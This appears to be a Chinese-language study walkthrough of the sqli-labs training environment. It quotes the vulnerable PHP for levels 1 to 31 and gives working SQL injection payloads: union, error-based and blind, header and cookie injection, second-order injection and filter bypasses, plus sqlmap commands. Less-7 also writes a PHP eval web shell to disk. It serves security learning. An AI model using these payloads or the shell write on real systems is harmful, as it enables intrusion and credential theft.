

![image-20241202203446278](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202203446278.png)

## 环境搭建

```
docker pull acgpiano/sqli-labs
sudo docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs
```

## less-1 联合注入

判断注入类型

一个单引号报错，两个单引号不报错，判断可能是字符型

尝试闭合，成功没报错，为字符型

```
1' and '1'='1
```

判断字段数

```
1' order by 3--+
1' order by 4--+
1' group by 4--+
```

4报错，3不报错，判断字段数为3

联合注入

查询所有库名

```
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+

information_schema 是存储所有表结构的数据库
information_schema.schemata 是存储数据库名字的表
```

查询所有表名

```
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

information_schema.tables 是存储所有表名的表
```

查询列

```
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

information_schema.columns 存储列的表
```

查询用户名，密码

```
-1' union select 1,group_concat(username,'@',password),3 from security.users--+
```

![image-20241202204655496](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202204655496.png)

## less-2 联合注入

数字类型

```
1/1 成功回显
1/2 无回显
1/0 无回显
```

同样查用户民和密码

```
-1 union select 1,group_concat(username,'@',password),3 from security.users--+
```

## less-3 联合注入

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

`')`进行闭合

```
1’) --+
1') and ('1')=('1
```

```
-1') union select 1,group_concat(schema_name),3 from information_schema.schemata --+

-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

-1') union select 1,group_concat(username,'@',password),3 from security.users --+
```

## less-4 联合注入

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

`")`闭合

```
1")--+
1") and ("1")=("1
```

```
-1") union select 1,group_concat(schema_name),3 from information_schema.schemata --+

-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

-1") union select 1,group_concat(username,'@',password),3 from users --+
```

## less-5 报错注入

报错注入

```php+HTML
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else 
        {

        echo '<font size="3" color="#FFFF00">';
        print_r(mysql_error());
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
        else { echo "Please input the ID as parameter with numeric value";}
```

```
1' and updatexml(1,concat(0x7e,(select substring(group_concat(username,'@',password),10)from users),0x7e),1)--+
```

![image-20241202221210721](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202221210721.png)

使用`substring`函数一点一点往后取

```sql
SUBSTRING(string FROM start FOR length)
```

- `string`：要提取子字符串的原始字符串。
- `start`：子字符串开始的位置（从1开始计数）。
- `length`：要提取的子字符串的长度。

## less-6 报错注入

```php+HTML
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else 
        {

        echo '<font size="3"  color= "#FFFF00">';
        print_r(mysql_error());
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
        else { echo "Please input the ID as parameter with numeric value";}
```

报错注入，用双引号闭合

```
1" and updatexml(1,concat(0x7e,(select substring(group_concat(username,'@',password),1)from users),0x7e),1)--+
```

布尔盲注(left)

```
1" and left(database(),1)>'r'--+ 正常回显
1" and left(database(),1)>'s'--+ 错误回显
```

第一个字母是`r`

```
1" and left(database(),2)>'sd'--+ 正常回显
1" and left(database(),2)>'se'--+ 错误回显
```

第二个字母是`e`

......

## less-7 into outfile

```php+HTML
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font color= "#FFFF00">';
        echo 'You are in.... Use outfile......';
        echo "<br>";
        echo "</font>";
        }
        else 
        {
        echo '<font color= "#FFFF00">';
        echo 'You have an error in your SQL syntax';
        //print_r(mysql_error());
        echo "</font>";  
        }
}
        else { echo "Please input the ID as parameter with numeric value";}
```

闭合`'))`

提示用outfile，直接写shell

```
1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile "/var/www/html/Less-7/1.php"-- a
```

用`<?php eval($_POST[cmd]);?>`的十六进制写

注意给目录写权限，以mysql身份写的文件

```shell
-rw-rw-rw- 1 mysql    mysql      43 Dec  2 16:04 shell.php
```

## less-8 布尔盲注

单引号盲注

```php+HTML
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else 
        {

        echo '<font size="5" color="#FFFF00">';
        //echo 'You are in...........';
        //print_r(mysql_error());
        //echo "You have an error in your SQL syntax";
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
        else { echo "Please input the ID as parameter with numeric value";}
```

**布尔盲注**

判断数据库长度

```
1' and if(length(database())=8,1,0) -- a
1' and (length(database())) = 8 --+
1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+
```

数据库长度为8

猜数据库名

```
1' and ascii(substr((select database()),1,1))=115 --+ 第一个是s
1' and if(ascii(substr((select database()),1,1))=115,1,0)--+

1' and ascii(substr((select database()),2,1))=101 --+ 第二个是e
1' and if(ascii(substr((select database()),2,1))=101,1,0) --+

1' and if(ascii(substr((select database()),3,1))=99,1,0) --+ 第三个是c
1' and if(ascii(substr((select database()),3,1))=99,1,0) --+
......
```

猜表的长度

```
第一行表的长度为6
1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,1,0)--+

第一行表的长度为8
1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8,1,0)--+
......
```

猜表名

```
第一个表的第一个字母是e
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,0) --+

第一个表的第二个字母是m
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109,1,0) --+
......
```

猜列名

```
1' and if(ascii(substr((select username from users limit 0,1),3,1))=109,1,0)-- a
```

```sql
SUBSTR(string, start, length)
```

- `string`：要提取子字符串的原始字符串。
- `start`：子字符串开始的位置（从1开始计数）。
- `length`：要提取的子字符串的长度。

```sql
SELECT * FROM table_name LIMIT offset, number_of_rows;
```

- `offset`：指定从哪一条记录开始返回结果（从0开始计数）。
- `number_of_rows`：指定返回结果的最大行数。

## less-9 时间盲注

时间盲注

```php+HTML
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else 
        {

        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        //print_r(mysql_error());
        //echo "You have an error in your SQL syntax";
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
```

判断注入

```
1' and if(1=1, sleep(5), null) --+
```

猜数据库长度

长度为8，休眠2秒执行

```
1' and if((length(database()))=8,sleep(2),0)--+
```

猜数据库名称

```
1' and if(ascii(substr(database(),1,1))=115,sleep(2),0)--+
```

跟上面的布尔盲注一样的，只是没办法查看true，false

猜表名

```
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(2),0) --+
```

猜表名

```
1' and if(ascii(substr((select username from users limit 0,1),3,1))=109,sleep(2),0)-- a
```

## less-10 时间盲注

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

双引号闭合

判断注入

```
1" and if(1=1,sleep(2),1) -- a
```

猜数据库长度

```
1" and length(database())=8 and if(1=1,sleep(2),1) -- a
```

ascii码 猜数据库名称

```
1" and (ascii(substr((select database()),1,1)))=115 and if(1=1,sleep(2),1) -- a
```

猜表名

```
1" and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 and if(1=1,sleep(2),1) -- a
```

猜列名

```
1" and (ascii(substr((select username from users limit 0,1),1,1)))=68 and if(1=1,sleep(2),1) -- a
```

## less-11 报错注入

报错注入，时间盲注

```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
       	$result=mysql_query($sql);
        $row = mysql_fetch_array($result);
        if($row)
        {
                echo 'Your Login name:'. $row['username'];
                echo "<br>";
                echo 'Your Password:' .$row['password'];
        }
        else  
        {
                print_r(mysql_error());
                echo "</br>";
        }
}
```

万能密码`1' or 1=1#`

报错注入

```
uname='+-extractvalue(1,concat(0x5c,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1)))-'
```

```
查表名
'+-extractvalue(1,concat(0x5c,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1)))-'

查字段名
+-extractvalue(1,concat(0x5c,(select+column_name+from+information_schema.columns+where+table_name='users'+limit+1,1)))-'

查内容
'+-extractvalue(1,concat(0x5c,(select+password+from+security.users+limit+0,1)))-'
```

## less-12 报错注入

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
if($row)
        {
                echo 'Your Login name:'. $row['username'];
                echo 'Your Password:' .$row['password'];
        }
        else  
        {
                print_r(mysql_error());
        }
}
```

闭合`")`

```
")+-extractvalue(1,concat(0x5c,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1)))-("
```

## less-13 报错注入

```php
@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

闭合`')`

万能密码`1') or ('1')=('1`

报错注入

```
')+-(updatexml(1,concat(0x7e,(select+username+from+users+limit+0,1)),0x7e),1)-('
') and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#
```

## less-14 报错注入

```php
$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
```

闭合`"`,和上面的一样

## less-15 时间盲注

时间盲注

```php+HTML
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
        if($row)
        {
                echo '<font size="3" color="#0000ff">';
                echo "<br>";
        }
        else  
        {
                echo '<font color= "#0000ff" font size="3">';
                //print_r(mysql_error());
        }
```

sqlmap

```
sqlmap -u 'http://192.168.27.14/Less-15/' --data "uname=1&passwd=1&submit=Submit" -p 'uname' -dbms=mysql --random-agent --flush-session --technique=T
```

```
sqlmap -u 'http://192.168.27.14/Less-15/' --forms -p 'uname' -dbms=mysql --random-agent --flush-session --technique=T
```

## less-16 时间盲注

时间盲注

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
if($row)
        {
                echo "<br>";
                echo '<font color= "#FFFF00" font size = 4>';
                echo "<br>";
        }
        else  
        {
                echo '<font color= "#0000ff" font size="3">';
                echo "</br>";
                echo "</br>";
        }
```

`"`闭合

```
1"+and+(select+1+from+(select(sleep(2)))aa)+and+"1"="1
```

## less-17 update 报错注入

```php
function check_input($value)
        {
        if(!empty($value))
                {
                // truncation (see comments)
                $value = substr($value,0,15);
                }

                // Stripslashes if magic quotes enabled
                if (get_magic_quotes_gpc())
                        {
                        $value = stripslashes($value);
                        }

                // Quote if not a number
                if (!ctype_digit($value))
                        {
                        $value = "'" . mysql_real_escape_string($value) . "'";
                        }

        else
                {
                $value = intval($value);
                }
        return $value;
        }

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
//making sure uname is not injectable
$uname=check_input($_POST['uname']);  
$passwd=$_POST['passwd'];


//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'User Name:'.$uname."\n");
fwrite($fp,'New Password:'.$passwd."\n");
fclose($fp);

// connectivity 
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
        if($row)
        {
                $row1 = $row['username'];  
                $update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
                mysql_query($update);
                if (mysql_error())
                {
                        print_r(mysql_error());
                }
                else
                {
                        //echo " You password has been successfully updated " ;
                        echo "<br>";
                }
                echo "</font>";
        }
        else  
        {
                echo '<font size="4.5" color="#FFFF00">';
                //echo "Bug off you Silly Dumb hacker";
        }
}
```

报错注入 

```
在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据。

常用的MySQL报错函数

--xpath语法错误
extractvalue()	--查询节点内容，接收两个参数，报错位置在第二个参数
updatexml()		--修改查询到的内容，接收三个参数，报错位置在第二个参数
它们的第二个参数都要求是符合xpath语法的字符串
如果不满足要求则会报错，并且将查询结果放在报错信息里

--主键重复（duplicate entry）
floor()			--返回小于等于该值的最大整数
只要是count，rand()，group by 三个连用就会造成这种主键重复报错
```

[报错函数](https://blog.csdn.net/weixin_54217950/article/details/122938063)

**查表**

floor函数

```
or (select 1 from (select count(*),concat(0x7e,(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```

```
'or+(select+1+from+(select+count(*),concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1),0x7e,floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+
```

extractvalue函数

```
'and+extractvalue(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1),0x7e))
```

updatexml函数

```
'and+updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1),0x7e),1)--+
```

查列

```
'and+updatexml(1,concat(0x7e,(select+username+from++users++limit+1,1),0x7e),1)--+
```

## less-18 UA 报错注入

```php
$uagent = $_SERVER['HTTP_USER_AGENT'];
        $IP = $_SERVER['REMOTE_ADDR'];
        echo "<br>";
        echo 'Your IP ADDRESS is: ' .$IP;
        echo "<br>";
        //echo 'Your User Agent is: ' .$uagent;
// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
        {
        $uname = check_input($_POST['uname']);
        $passwd = check_input($_POST['passwd']);
        /*
        echo 'Your Your User name:'. $uname;
        echo "<br>";
        echo 'Your Password:'. $passwd;
        echo "<br>";
        echo 'Your User Agent String:'. $uagent;
        echo "<br>";
        echo 'Your User Agent String:'. $IP;
        */
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$result1 = mysql_query($sql);
$row1 = mysql_fetch_array($result1);
                if($row1)
                        {
                        echo '<font color= "#FFFF00" font size = 3 >';
                        $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                        mysql_query($insert);
                        echo '<font color= "#0000ff" font size = 3 >';
                        echo 'Your User Agent is: ' .$uagent;
                        print_r(mysql_error());
                        }
                else
                        {
                        print_r(mysql_error());  
                        }
}
```

ua头注入

```http
POST /Less-18/ HTTP/1.1
Host: 192.168.27.14
User-Agent: 1' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1'='1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

uname=Dumb&passwd=0&submit=Submit
```

## less-19 Referer 报错注入

和上面一样的，换了个http头

```http
POST http://192.168.27.14/Less-19/ HTTP/1.1
Host: 192.168.27.14
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Referer: ' and updatexml(1,concat(0x7e,user()),1) and '1'='1
Connection: keep-alive
Content-Length: 33

uname=Dumb&passwd=0&submit=Submit
```

## less-20 cookie 报错注入

```php
$cookee = $_COOKIE['uname'];
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
$result=mysql_query($sql);
if (!$result)
        {
        die('Issue with your mysql: ' . mysql_error());
        }
$row = mysql_fetch_array($result);
if($row)
        {
        echo '<font color= "pink" font size="5">';
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo '<font color= "grey" font size="5">';  
        echo 'Your Password:' .$row['password'];
        echo "</font></b>";
        echo "<br>";
        echo 'Your ID:' .$row['id'];
        }
else
        {
        echo "<center>";
        echo '<br><br><br>';
        echo '<img src="../images/slap1.jpg" />';
        echo "<br><br><b>";
        //echo '<img src="../images/Less-20.jpg" />';
        }
```

和上面一样的，换成cookie了

```http
GET /Less-20/index.php HTTP/1.1
Host: 192.168.27.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Cookie: uname=Dumb'- updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)-'
```

## less-21 cookie base64 报错注入

```php
$cookee = $_COOKIE['uname'];
$cookee = base64_decode($cookee);
echo "<br></font>";
$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
$result=mysql_query($sql);
if (!$result)
        {
        die('Issue with your mysql: ' . mysql_error());
        }
$row = mysql_fetch_array($result);
if($row)
        {
        echo '<font color= "pink" font size="5">';
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo '<font color= "grey" font size="5">';  
        echo 'Your Password:' .$row['password'];
        echo "</font></b>";
        echo "<br>";
        echo 'Your ID:' .$row['id'];
        }
```

![image-20241206154956021](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241206154956021.png)

将上一题的payload进行base64编码即可

```http
GET /Less-21/index.php HTTP/1.1
Host: 192.168.27.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Cookie: uname=RHVtYictIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLSc=
```

## less-22 cookie base64

```php
$cookee = base64_decode($cookee);
$cookee1 = '"'. $cookee. '"';
echo "<br></font>";
$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
$result=mysql_query($sql);
if (!$result)
{
	die('Issue with your mysql: ' . mysql_error());
}
$row = mysql_fetch_array($result);
```

双引号闭合，在base64编码

payload

```
RHVtYiItIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLSI=
```

```http
GET /Less-22/index.php HTTP/1.1
Host: 192.168.27.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Cookie: uname=RHVtYiItIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLSI=
```

## less-23  开始过滤 报错注入

```php
$id=$_GET['id'];

//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);

// connectivity 
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font color= "#0000ff">';
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo 'Your Password:' .$row['password'];
        echo "</font>";
        }
        else 
        {
        echo '<font color= "#FFFF00">';
        print_r(mysql_error());
        echo "</font>";  
        }
}
        else { echo "Please input the ID as parameter with numeric value";}
```

过滤`#`，`--`

```
1'-updatexml(1,concat(0x7e,(select+username+from++users++limit+0,1),0x7e),1)+and+'1'='1
```

## less-24 二次注入

`login.php`

```php
function sqllogin(){
   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysql_fetch_row($res);
        //print_r($row) ;
   if ($row[1]) {
		return $row[1];
   } else {
		return 0;
   }
}
```

登录口有`mysql_real_escape_string`函数

该函数对特殊字符进行转义，不能进行注入

`new_user.php`

```php
if ($pass==$re_pass)
{
    # Building up the query........
    $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
    mysql_query($sql) or die('Error Creating your user account,  : '.mysql_error());
    echo "</br>";
    echo "<center><img src=../images/Less-24-user-created.jpg><font size='3' color='#FFFF00'>";   
    //echo "<h1>User Created Successfully</h1>";
    echo "</br>";
    echo "</br>";
    echo "</br>";
    echo "</br>Redirecting you to login page in 5 sec................";
    echo "<font size='2'>";
    echo "</br>If it does not redirect, click the home button on top right</center>";
    header('refresh:5, url=index.php');
}
```

插入

创建用户界面，创建用户后登录

![image-20241207194307801](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241207194307801.png)

发现回显了用户名，但是回显的用户名中的特殊字符并没有被转义，可以尝试二次注入

寻找可以引用这个用户名的功能点，修改密码就可以

我们修改`admin' #`用户的密码，但是真实修改的却是admin的密码

修改密码

`pass_change.php`

```php
if (isset($_POST['submit']))
{
        # Validating the user input........
        $username= $_SESSION["username"];
        $curr_pass= mysql_real_escape_string($_POST['current_password']);
        $pass= mysql_real_escape_string($_POST['password']);
        $re_pass= mysql_real_escape_string($_POST['re_password']);

        if($pass==$re_pass)
        {
                $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
                $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
                $row = mysql_affected_rows();
                echo '<font size="3" color="#FFFF00">';
                echo '<center>';
                if($row==1)
                {
                        echo "Password successfully updated";
                }
                else
                {
                        header('Location: failed.php');
                        //echo 'You tried to be smart, Try harder!!!! :( ';
                }
}
```

这里username是直接取出来的，没有做什么转义`$username= $_SESSION["username"];`

那么，我们的payload`admin' #`,放入语句

```
UPDATE users SET PASSWORD='$pass' where username='admin' #' and password='$curr_pass'
```

这样就造成了二次注入

漏洞原因：插入数据库里的脏数据并没有做转义，过滤就拿出来直接用，导致二次注入

![image-20241207195150260](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241207195150260.png)

## less-25 过滤 or and

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id); //Strip out AND (non case sensitive)
	return $id;
}
```

过滤了`or`,`and`，会将这两替换为空，双写绕过

符号替换

```
or -> ||
and -> &&
```

```
1'+oorr+1=1%23
1'+anandd+1=1%23
-1'+union+select+1,user(),database()%23
```

## less-25a

数字型

```
1+oorrder+by+3--+
```

```
-1+union+select+1,2,3--+
```

## less-26 过滤空格

```php
# 过滤了 or 和 and 大小写
$id= preg_replace('/or/i',"", $id);            //strip out OR (non case sensitive)
$id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive)

# 过滤了 /*
$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*

# 过滤了 -- 和 # 注释
$id= preg_replace('/[--]/',"", $id);        //Strip out --
$id= preg_replace('/[#]/',"", $id);            //Strip out #

# 过滤了空格
$id= preg_replace('/[\s]/',"", $id);        //Strip out spaces

# 过滤了斜线
$id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes
return $id;
```

过滤了 or 和 and 可以采用 双写或者 && || 绕过

过滤注释 可以使用闭合绕过

过滤了空格 可以使用如下的符号来替代：

| 符号 | 说明          |
| ---- | ------------- |
| %09  | TAB 键 (水平) |
| %0a  | 新建一行      |
| %0c  | 新的一页      |
| %0d  | return 功能   |
| %0b  | TAB 键 (垂直) |
| %a0  | 空格          |

或者用括号代替空格

```
1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(username,'~',passwoorrd))from(security.users)),0x7e))oorr'
```

payload

```
1'%0banandd%0bupdatexml(1,concat(0x7e,(select%0bgroup_concat(username,passwoorrd)from%0bsecurity.users)),1)%0banandd%0b'1'='1
```

## less-26a

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

闭合方式改了`')`

payload

```
')%0b||(select%0b1%0bfrom%0b(select(sleep(3)))aa)%0b||('1

')union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3
||('1
```

## less-27 过滤union select

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);          //strip out /*
$id= preg_replace('/[--]/',"", $id);            //Strip out --.
$id= preg_replace('/[#]/',"", $id);               //Strip out #.
$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
$id= preg_replace('/select/m',"", $id);     //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
$id= preg_replace('/union/s',"", $id);      //Strip out union
$id= preg_replace('/select/s',"", $id);     //Strip out select
$id= preg_replace('/UNION/s',"", $id);      //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);     //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);      //Strip out Union
$id= preg_replace('/Select/s',"", $id);     //Strip out select
return $id;
}
```

可以使用大小写绕过

payload

```
1111'%0bununionion%0bsElect%0b1,(sElect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||'1
```

```
1111'%0bunioN%0bsElect%0b1,(sElselectect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||'1
```

## less-27a

闭合方式改成`"`双引号

payload

```
1111"%0bunioN%0bsElect%0b1,(sElect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||"1
```

## less-28 union\s+select/i

```php
# 过滤 /*
$id= preg_replace('/[\/\*]/',"", $id);

# 过滤 - # 注释
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);

# 过滤 空格 +
$id= preg_replace('/[ +]/',"", $id);.

# 过滤 union select /i 大小写都过滤
# \s+ 匹配一个或多个空白字符（包括空格、制表符、换行符等
$id= preg_replace('/union\s+select/i',"", $id);
return $id;
```

闭合方式`')`

payload

```
1111')%0bunioN%0bsElect%0b1,(sElect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||('1
```

## less-28a

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
function blacklist($id)
{
//$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*
//$id= preg_replace('/[--]/',"", $id);                  //Strip out --.
//$id= preg_replace('/[#]/',"", $id);                   //Strip out #.
//$id= preg_replace('/[ +]/',"", $id);                  //Strip out spaces.
//$id= preg_replace('/select/m',"", $id);               //Strip out spaces.
//$id= preg_replace('/[ +]/',"", $id);                  //Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);         //Strip out spaces.
return $id;
}
```

闭合`')`

payload

```
1111')%0bunion%0bselect%0b1,(select%0bgroup_concat(username,':',password)%0bfrom%0busers),3||('1
```

## less-29 waf

源代码

```php
if(isset($_GET['id']))
{
        $qs = $_SERVER['QUERY_STRING'];
        $hint=$qs;
        $id1=java_implimentation($qs);
        $id=$_GET['id'];
        whitelist($id1);
    
		// connectivity 
        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
        $result=mysql_query($sql);
        $row = mysql_fetch_array($result);
        if($row)
        {
                echo 'Your Login name:'. $row['username'];
                echo 'Your Password:' .$row['password'];
        }
        else 
        {
                print_r(mysql_error());
        }
}
```

waf

```php
function whitelist($input)
{
        $match = preg_match("/^\d+$/", $input);
        if($match)
        {
                //echo "you are good";
                //return $match;
        }
        else
        {
                header('Location: hacked.php');
                //echo "you are bad";
        }
}

// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
function java_implimentation($query_string)
{
        $q_s = $query_string;
        $qs_array= explode("&",$q_s);

        foreach($qs_array as $key => $value)
        {
                $val=substr($value,0,2);
                if($val=="id")
                {
                        $id_value=substr($value,3,30); 
                        return $id_value;
                        echo "<br>";
                        break;
                }

        }

}
```

payload

```
-1'+union+select+1,user(),(select+group_concat(username,':',password)+from+users)--+
```

## less-30 waf

```php
$id = '"' .$id. '"';
// connectivity 
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

双引号闭合

```
-1"+union+select+1,user(),(select+group_concat(username,':',password)+from+users)--+
```

## less-31

```php
$id = '"'.$id.'"';
// connectivity 
$sql="SELECT * FROM users WHERE id= ($id) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

闭合`")`

payload

```
